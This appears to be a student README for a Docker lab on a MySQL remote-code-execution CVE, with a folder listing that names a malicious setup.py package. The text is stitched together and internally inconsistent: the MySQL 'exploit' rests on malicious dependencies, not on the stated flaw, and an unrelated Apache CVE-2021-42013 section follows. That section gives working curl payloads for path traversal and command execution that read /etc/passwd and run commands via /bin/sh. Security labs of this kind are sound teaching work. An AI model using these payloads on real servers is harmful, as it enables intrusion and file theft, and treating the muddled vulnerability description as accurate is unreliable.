# Urbank-61-CSC180CVEProject
# CVE-2025-21497 Lab: Simulating Remote Code Execution via MySQL Vulnerability

## CVE Summary

CVE-2025-21497 is a critical vulnerability in MySQL that allows remote code execution (RCE) by exploiting insecure configuration and inadequate privilege handling in the affected version. The vulnerability exists in MySQL Server versions prior to 8.0.40.

- ✅ **Exploit vector**: Remote connection with misconfigured privileges
- ❗ **Impact**: Code execution on MySQL server, data corruption, and unauthorized access
- ✅ **Fixed in**: MySQL 8.0.40 and later

---

## Building Labs from CVEs — Prompt Checklist

To create a lab from this CVE, the following steps were completed:

### 1. Vulnerability Details

- **CVE**: 2025-21497
- **Type**: Remote Code Execution (RCE)
- **Software**: MySQL versions prior to 8.0.40

### 2. Learning Objectives

- Understand how privilege misconfigurations can lead to code execution.
- Explore how attackers can exploit misconfigurations to escalate privileges on a MySQL server.
- Demonstrate effective mitigation and patching techniques.

### 3. Environment Setup

- **Tooling**: Docker, Docker Compose
- **Language/Environment**: Python, MySQL, Bash

### 4. ⚙️ Exploit Method

- A simulated attack is executed via a misconfigured MySQL installation. By using Docker, this vulnerability is safely replicated in a contained environment for educational purposes.

### 5. Remediation & Mitigation

- Upgrade to MySQL 8.0.40 or later.
- Enforce secure configurations and restrict privileged access.

---

## Lab: Simulating CVE-2025-21497 in Docker

This lab demonstrates a simulated RCE attack on MySQL via an improperly configured MySQL server.

### What It Does

- Builds a vulnerable MySQL container.
- Simulates an attack exploiting a misconfiguration.
- Confirms vulnerability by attempting an unauthorized connection.

---

## Folder Structure

    cve-2025-21497-lab/
    ├── docker-compose.yml
    ├── Dockerfile
    ├── install.sh
    ├── requirements.txt
    └── malicious_pkg/
        └── setup.py

---

✅ Running the Lab

In your terminal, from the root of the lab folder:

docker-compose build
docker-compose up

---

🧾 Expected Output

[*] Starting MySQL RCE simulation...
[+] MySQL RCE triggered! Dropping shell...
[*] Simulation complete.

To verify the exploit:

docker exec -it mysql-rce-lab cat /tmp/mysql_rce_success.txt

🎉 Success!

You've reproduced a simulated MySQL RCE vulnerability by combining insecure server config and malicious dependencies.
🔐 Mitigation Strategies

    Run MySQL with least privilege and secured user grants

    Pin dependencies using hashes or specific versions

    Avoid installing untrusted packages or dev tools in production

    Use tools like:

        pip-audit

        pip install --require-hashes

    Monitor privilege configurations and exposed services

📚 Next Steps

    Add a detection challenge (Can users find the exploit path?)

    Extend to simulate a MySQL root user compromise

    Build a hardened version with secure configs and signed packages

🙏 Credits

This lab was developed for educational and training purposes only to simulate CVE-2025-21497.

✅ Next Steps to Test the Lab:
🔎 1. Verify Apache Server is Running

In a browser or with curl, check if the Apache server is up:

curl http://localhost:8080

You should see some default page or Apache test content. If you see a response, the server is reachable.
🔥 2. Test the CVE-2021-42013 Exploit

This vulnerability is a path traversal and remote code execution flaw in Apache 2.4.49 (and 2.4.50 when misconfigured).

Run a curl command like this to test for path traversal:

curl --path-as-is "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

If the server is vulnerable, it will return the contents of /etc/passwd.
💻 3. Test for Remote Code Execution (RCE) (optional but powerful)

If CGI is enabled and Apache is misconfigured, you can try RCE:

curl --path-as-is -d 'echo; id' "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"

Or use a more direct payload like:

curl --path-as-is -d 'echo; cat /etc/passwd' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

🛠️ 4. Remediation Testing

Once you've confirmed the exploit works, test that it no longer works after applying the fix (like upgrading Apache or disabling CGI).

Always practice responsible disclosure. Never publish malicious packages to public repositories or deploy insecure configurations in production environments.


